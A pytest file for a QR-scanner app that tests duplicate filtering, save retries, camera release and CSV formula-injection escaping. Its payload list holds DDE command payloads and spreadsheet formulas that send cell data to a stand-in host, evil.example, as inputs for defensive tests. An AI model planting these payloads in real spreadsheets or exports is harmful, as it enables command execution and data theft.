"""
Follow-up tests for the four points raised in the outside review of the
November 5, 2026 record (see docs/REVIEW-RECORD-2026-11-05.md, section 9):

1. Duplicate filter state changes
2. Failed saves are not treated as done, on every live-scan path
3. The camera is released when the worker fails, stops or times out
4. CSV formula protection against more payloads
"""

import csv
import tempfile
import threading
import time
from pathlib import Path

import cv2
import pytest

from shared.config import Config
from shared.qr_scanner import QRScanner, ScanResult

FIXTURES = Path(__file__).parent / "fixtures"


def _r(data="abc", fmt="QRCODE"):
    return ScanResult(data=data, format=fmt)


def _datas(results):
    return [r.data for r in results]


class _FakeCapture:
    """Stands in for cv2.VideoCapture"""

    def __init__(self, frame=None, frames=10, on_empty=None, read_error=None, block=None):
        self.frame = frame
        self.remaining = frames
        self.on_empty = on_empty
        self.read_error = read_error
        self.block = block
        self.reading = threading.Event()
        self.released = False
        self.reads = 0

    def read(self):
        self.reads += 1
        self.reading.set()
        if self.block is not None:
            self.block.wait()
        if self.read_error is not None:
            raise self.read_error
        if self.remaining <= 0:
            if self.on_empty:
                self.on_empty()
            return False, None
        self.remaining -= 1
        return True, self.frame.copy()

    def release(self):
        self.released = True

    def isOpened(self):
        return not self.released


def _qr_frame():
    return cv2.imread(str(FIXTURES / "qr_url.png"))


# ---------------------------------------------------------------------------
# 1. Duplicate filter
# ---------------------------------------------------------------------------

class TestDuplicateFilterStates:

    def test_scans_again_after_leaving_view_for_cooldown(self):
        s = QRScanner(duplicate_cooldown=5)
        reported = []
        # In view for 2 s (10 frames a second), out of view for 6 s, back
        for tenth in range(20):
            reported += s.filter_new([_r()], now=tenth / 10)
        for tenth in range(80, 90):
            reported += s.filter_new([_r()], now=tenth / 10)
        assert len(reported) == 2

    def test_short_absence_is_not_a_new_scan(self):
        """Out of view for less than the cooldown: still the same scan"""
        s = QRScanner(duplicate_cooldown=5)
        assert len(s.filter_new([_r()], now=0.0)) == 1
        assert s.filter_new([_r()], now=4.0) == []  # back after 4 s

    def test_cooldown_counts_from_last_sighting(self):
        s = QRScanner(duplicate_cooldown=5)
        s.filter_new([_r()], now=0.0)
        s.filter_new([_r()], now=3.0)          # still seen at 3 s
        assert s.filter_new([_r()], now=7.0) == []        # 4 s after last sighting
        assert len(s.filter_new([_r()], now=12.0)) == 1   # 5 s after last sighting

    def test_same_text_different_format_both_reported(self):
        s = QRScanner(duplicate_cooldown=5)
        fresh = s.filter_new([_r("123", "QRCODE"), _r("123", "CODE128")], now=0.0)
        assert [(r.format, r.data) for r in fresh] == [("QRCODE", "123"), ("CODE128", "123")]

    def test_different_text_same_frame_both_reported(self):
        s = QRScanner(duplicate_cooldown=5)
        assert _datas(s.filter_new([_r("a"), _r("b")], now=0.0)) == ["a", "b"]

    def test_new_code_reported_while_old_one_suppressed(self):
        s = QRScanner(duplicate_cooldown=5)
        s.filter_new([_r("a")], now=0.0)
        assert _datas(s.filter_new([_r("a"), _r("b")], now=1.0)) == ["b"]

    def test_alternating_codes_each_reported_once(self):
        s = QRScanner(duplicate_cooldown=5)
        reported = []
        for i in range(20):
            reported += s.filter_new([_r("a" if i % 2 else "b")], now=i / 10)
        assert sorted(_datas(reported)) == ["a", "b"]

    def test_same_code_twice_in_one_frame_reported_once(self):
        s = QRScanner(duplicate_cooldown=5)
        assert len(s.filter_new([_r("a"), _r("a")], now=0.0)) == 1

    def test_text_differing_only_in_case_or_space_is_different(self):
        s = QRScanner(duplicate_cooldown=5)
        fresh = s.filter_new([_r("abc"), _r("ABC"), _r("abc ")], now=0.0)
        assert len(fresh) == 3

    def test_memory_pruning_keeps_recent_codes(self):
        s = QRScanner(duplicate_cooldown=5)
        s.filter_new([_r("keep")], now=100.0)
        s.filter_new([_r(f"old{i}") for i in range(1001)], now=100.5)
        # "keep" was seen 1 s ago, so it must still be suppressed
        assert s.filter_new([_r("keep")], now=101.0) == []


# ---------------------------------------------------------------------------
# 2. Failed saves
# ---------------------------------------------------------------------------

class TestFailedSaves:

    def test_failed_code_retried_while_still_in_view(self):
        s = QRScanner(duplicate_cooldown=5)
        r = _r()
        assert len(s.filter_new([r], now=0.0)) == 1
        s.mark_failed(r, retry_after=1.0, now=0.0)
        assert s.filter_new([r], now=0.5) == []        # waits for the retry delay
        assert len(s.filter_new([r], now=1.0)) == 1    # retried, never left view
        # After a successful save it is suppressed as usual
        assert s.filter_new([r], now=1.5) == []

    def test_failure_does_not_affect_other_codes(self):
        s = QRScanner(duplicate_cooldown=5)
        s.filter_new([_r("a"), _r("b")], now=0.0)
        s.mark_failed(_r("a"), retry_after=1.0, now=0.0)
        assert _datas(s.filter_new([_r("a"), _r("b")], now=1.0)) == ["a"]

    def test_reset_clears_pending_retries(self):
        s = QRScanner(duplicate_cooldown=5)
        s.mark_failed(_r(), retry_after=60, now=0.0)
        s.reset_duplicates()
        assert len(s.filter_new([_r()], now=1.0)) == 1

    def test_desktop_worker_retries_failed_save(self):
        pytest.importorskip("PyQt5")
        from desktop.camera import CameraWorker

        scanner = QRScanner(duplicate_cooldown=5)
        scanner.is_running = True

        class FailOnceManager:
            def __init__(self):
                self.calls = 0
                self.saved = []

            def save_scan(self, result):
                self.calls += 1
                if self.calls == 1:
                    return None  # first write fails
                self.saved.append(result.data)
                return self.calls

        manager = FailOnceManager()
        worker = CameraWorker(scanner, manager)
        emitted = []
        worker.scan_result.connect(lambda d: emitted.append(d["id"]))
        scanner.cap = _FakeCapture(
            _qr_frame(), frames=6, on_empty=lambda: setattr(worker, "is_running", False)
        )

        original = Config.SAVE_RETRY_DELAY
        Config.SAVE_RETRY_DELAY = 0  # retry on the next frame
        try:
            worker.run()  # runs the loop in this thread until frames run out
        finally:
            Config.SAVE_RETRY_DELAY = original

        assert manager.calls == 2          # failed once, retried once
        assert manager.saved == ["https://example.com/test"]
        assert emitted == [2]              # only the saved one reaches the table

    def test_android_live_mode_retries_failed_save(self, monkeypatch, tmp_path, capsys):
        import android.qr_scanner_android as app
        from shared.data_manager import DataManager

        monkeypatch.setattr(Config, "DB_PATH", tmp_path / "scans.db")
        monkeypatch.setattr(Config, "LOGS_DIR", tmp_path / "logs")
        monkeypatch.setattr(Config, "SAVE_RETRY_DELAY", 0)

        def fake_start(self):
            self.cap = _FakeCapture(
                _qr_frame(), frames=6, on_empty=lambda: setattr(self, "is_running", False)
            )
            self.is_running = True
            return True

        monkeypatch.setattr(QRScanner, "start", fake_start)

        real_save = DataManager.save_scan
        calls = []

        def fail_once(self, result, *args, **kwargs):
            calls.append(result.data)
            if len(calls) == 1:
                return None
            return real_save(self, result, *args, **kwargs)

        monkeypatch.setattr(DataManager, "save_scan", fail_once)

        assert app.main() == 0
        out = capsys.readouterr().out
        assert calls == ["https://example.com/test", "https://example.com/test"]
        assert "will retry" in out
        assert out.count("Saved with ID") == 1

        check = DataManager(db_path=str(tmp_path / "scans.db"))
        try:
            assert check.get_stats()["total_scans"] == 1
        finally:
            check.close()


# ---------------------------------------------------------------------------
# 3. Camera release
# ---------------------------------------------------------------------------

class TestCameraRelease:

    def test_scan_continuous_releases_when_callback_raises(self):
        s = QRScanner(duplicate_cooldown=5)
        cap = _FakeCapture(_qr_frame(), frames=5)
        s.cap, s.is_running = cap, True

        def boom(results):
            raise RuntimeError("callback failed")

        with pytest.raises(RuntimeError):
            s.scan_continuous(callback=boom)
        assert cap.released
        assert not s.is_running

    def test_scan_continuous_releases_when_read_raises(self):
        s = QRScanner()
        cap = _FakeCapture(read_error=OSError("camera unplugged"))
        s.cap, s.is_running = cap, True
        with pytest.raises(OSError):
            s.scan_continuous()
        assert cap.released

    def test_worker_releases_camera_when_read_raises(self):
        pytest.importorskip("PyQt5")
        from desktop.camera import CameraWorker

        s = QRScanner()
        cap = _FakeCapture(read_error=OSError("camera unplugged"))
        s.cap, s.is_running = cap, True
        worker = CameraWorker(s, manager=None)
        errors, finished = [], []
        worker.error_occurred.connect(errors.append)
        worker.finished.connect(lambda: finished.append(True))
        worker.run()
        assert cap.released
        assert errors == ["camera unplugged"]
        assert finished == [True]

    def test_worker_releases_camera_when_stopped(self):
        pytest.importorskip("PyQt5")
        from desktop.camera import CameraWorker

        s = QRScanner()
        worker = CameraWorker(s, manager=None)
        cap = _FakeCapture(None, frames=0, on_empty=worker.stop)
        s.cap, s.is_running = cap, True
        worker.run()
        assert cap.released


@pytest.fixture
def window(temp_db, monkeypatch):
    pytest.importorskip("PyQt5")
    import os

    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    from PyQt5.QtWidgets import QApplication, QMessageBox

    app = QApplication.instance() or QApplication([])
    monkeypatch.setattr(Config, "DB_PATH", temp_db)
    monkeypatch.setattr(QMessageBox, "critical", lambda *a, **k: None)
    from desktop.ui.main_window import MainWindow

    win = MainWindow()
    yield win, app
    win.manager.close()


def _process_until(app, condition, timeout=5.0):
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        app.processEvents()
        if condition():
            return True
        time.sleep(0.01)
    return False


def test_stop_when_camera_thread_is_stuck(window):
    """
    A camera read that never returns: Stop must not freeze the window,
    must not release the camera from the GUI thread, and must keep Start
    off until the thread really ends. When the read returns, the worker
    releases the camera and Start comes back.
    """
    win, app = window
    gate = threading.Event()
    cap = _FakeCapture(_qr_frame(), frames=1000, block=gate)

    def fake_start():
        win.scanner.cap = cap
        win.scanner.is_running = True
        return True

    win.scanner.start = fake_start
    win.stop_timeout_ms = 300

    win.start_scanning()
    assert cap.reading.wait(5), "worker never started reading"

    t0 = time.monotonic()
    win.stop_scanning()
    waited = time.monotonic() - t0

    assert waited < 2.0                          # window did not freeze
    assert not cap.released                      # not released mid-read
    assert not win.start_button.isEnabled()      # cannot start a second camera
    assert win.camera_label.text() == "Camera is still stopping..."
    assert len(win._stopping_threads) == 1       # thread kept alive, not deleted

    gate.set()                                   # the stuck read returns
    assert _process_until(app, lambda: not win._stopping_threads)
    assert cap.released                          # worker released it
    assert win.start_button.isEnabled()


def test_normal_stop_releases_camera(window):
    win, app = window
    cap = _FakeCapture(_qr_frame(), frames=100000)

    def fake_start():
        win.scanner.cap = cap
        win.scanner.is_running = True
        return True

    win.scanner.start = fake_start
    win.start_scanning()
    assert cap.reading.wait(5)
    win.stop_scanning()
    assert cap.released
    assert win.start_button.isEnabled()
    assert win._stopping_threads == []


# ---------------------------------------------------------------------------
# 4. CSV formula protection
# ---------------------------------------------------------------------------

FORMULA_PAYLOADS = [
    "=1+1",
    "+1+1",
    "-1+1",
    "@SUM(1,1)",
    "\t=1+1",
    "\r=1+1",
    "\n=1+1",
    " =1+1",
    "    =1+1",
    "\u00a0=1+1",          # no-break space
    "\u3000=1+1",          # ideographic (full-width) space
    "\u200b=1+1",          # zero-width space
    "\ufeff=1+1",          # byte-order mark
    "\uff1d1+1",           # full-width =
    "\uff0b1+1",           # full-width +
    "\uff0d1+1",           # full-width -
    "\uff20SUM(1,1)",      # full-width @
    "=cmd|' /C calc'!A0",                   # DDE
    "@SUM(1+1)*cmd|' /C calc'!A0",          # DDE behind @
    "+cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    '=HYPERLINK("http://evil.example","click")',
    '=IMPORTXML(CONCAT("http://evil.example/?v=",A1),"//a")',  # Google Sheets
    '=WEBSERVICE("http://evil.example/?"&A1)',                 # Excel
    "=DDE(\"cmd\";\"/C calc\";\"x\")",                          # LibreOffice
]

SAFE_VALUES = [
    "https://example.com/?a=1",
    "hello =1+1",
    "WIFI:S:home;T:WPA;P:x=y;;",
    "",
]


@pytest.mark.parametrize("payload", FORMULA_PAYLOADS)
def test_csv_payload_neutralised(data_manager, payload):
    data_manager.save_scan(ScanResult(data=payload, format="QRCODE"), tags=[payload], notes=payload)
    with tempfile.TemporaryDirectory() as tmpdir:
        out = Path(tmpdir) / "out.csv"
        assert data_manager.export_csv(str(out))
        with open(out, newline="", encoding="utf-8-sig") as f:
            row = next(csv.DictReader(f))
    for column in ("data", "tags", "notes"):
        assert row[column] == "'" + payload, column


@pytest.mark.parametrize("value", SAFE_VALUES)
def test_csv_safe_values_unchanged(data_manager, value):
    data_manager.save_scan(ScanResult(data=value, format="QRCODE"))
    with tempfile.TemporaryDirectory() as tmpdir:
        out = Path(tmpdir) / "out.csv"
        assert data_manager.export_csv(str(out))
        with open(out, newline="", encoding="utf-8-sig") as f:
            row = next(csv.DictReader(f))
    assert row["data"] == value
